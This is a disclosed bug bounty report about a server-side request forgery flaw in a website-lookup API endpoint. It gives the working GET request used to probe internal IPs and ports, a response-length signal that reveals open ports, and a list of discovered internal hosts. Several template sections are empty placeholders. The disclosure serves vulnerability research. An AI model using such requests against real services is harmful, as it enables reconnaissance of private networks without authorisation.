# SSRF in /cabinet/stripeapi/v1/siteInfoLookup?url=XXX

## Metadata
- **Source:** HackerOne
- **Report:** 738553 | https://hackerone.com/reports/738553
- **Submitted:** 2019-11-15
- **Reporter:** eliel
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Server-Side Request Forgery (SSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:
SSRF vulnerability allows mapping the internal network.

## Steps To Reproduce:
It is possible to run internal requests with the siteInfoLookup service.

```
GET /cabinet/stripeapi/v1/siteInfoLookup?url=http://10.0.0.100:8080 HTTP/1.1
Host: my.stripo.email
```

Based on the response we know if the ip / port is available or not.

The port is not accesible in that IP.
```
Content-Length:

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:
SSRF vulnerability allows mapping the internal network.

## Steps To Reproduce:
It is possible to run internal requests with the siteInfoLookup service.

```
GET /cabinet/stripeapi/v1/siteInfoLookup?url=http://10.0.0.100:8080 HTTP/1.1
Host: my.stripo.email
```

Based on the response we know if the ip / port is available or not.

The port is not accesible in that IP.
```
Content-Length: 0
```

The port is accesible in that IP.
```
Content-Length: 114 (>0)
```

## Supporting Material/References:
I was able to identify some internal IP address and open ports:
10.0.0.2:8080
10.0.0.3:8080
10.0.0.4:8080
10.0.0.5:8080 <- NOT ACCESIBLE

## Impact

It is possible to use this vulnerability to map the internal network.

</details>

---
*Analysed by Claude on 2026-05-24*
